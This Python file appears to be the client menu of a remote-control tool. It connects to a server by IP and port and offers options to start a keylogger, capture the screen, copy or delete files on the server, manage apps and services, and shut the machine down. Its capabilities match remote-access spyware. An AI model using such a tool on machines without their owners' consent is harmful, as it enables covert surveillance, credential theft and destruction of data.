import socket
from delete_copy_paste import copy_file_from_server, delete_file_from_server
from shutdown_reset import reset_server, shutdown_server
from screen_capturing import screen_capturing
from utils import clear_screen
from list_start_stop_app import list_start_stop_app
from list_start_stop_service import list_start_stop_service
from key_logger import toggle_key_logger

def is_valid_ip_address(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_valid_port(port):
    return 0 < port <= 65535

def main():
    while True:
        server_ip = input("Enter the server IP address: ")
        if not is_valid_ip_address(server_ip):
            print("Invalid IP address. Please try again.")
            continue

        try:
            port = int(input("Enter the server port: "))
        except ValueError:
            print("Port must be a number.")
            continue

        if not is_valid_port(port):
            print("Invalid port. Please enter a port between 1 and 65535.")
            continue

        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, port))
            print("Connected to the server successfully!")
            break
        except socket.error as e:
            print(f"Connection failed: {e}. Please check if the server is running and the IP and port are correct.")
            client_socket.close()
            continue

    while True:
        print("\n--- MAIN MENU ---")
        print("1. Application Processing")
        print("2. Service Processing")
        print("3. Shutdown Server")
        print("4. Reset Server")
        print("5. Server Screen Processing")
        print("6. Block Key")
        print("7. Start Keylogger")
        print("8. Delete File from Server")
        print("9. Copy File from Server")        
        print("0. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            list_start_stop_app(client_socket)
        elif choice == '2':
            list_start_stop_service(client_socket)   
        elif choice == '3':
            confirmation = input("Are you sure you want to shutdown the server? (yes/no): ").strip().lower()
            if confirmation == 'yes':
                shutdown_server(client_socket)
            else:
                print("Shutdown cancelled.")
        elif choice == '4':
            confirmation = input("Are you sure you want to reset the server? (yes/no): ").strip().lower()
            if confirmation == 'yes':
                reset_server(client_socket)
            else:
                print("Reset cancelled.")
        elif choice == '5':
            screen_capturing(client_socket)
        elif choice == '6':
            # client_socket.sendall("BLOCK_KEYS".encode())
            break
        elif choice == '7':
            toggle_key_logger(client_socket)
        elif choice == '8':
            file_path = input("Enter the full path of the file to delete on server: ")
            delete_file_from_server(client_socket, file_path)
        elif choice == '9':
            copy_file_from_server(client_socket)        
        elif choice == '0':
            client_socket.close()
            print("Disconnected from server.")
            break
        else:
            print("Invalid choice, try again.")

if __name__ == "__main__":
    main()
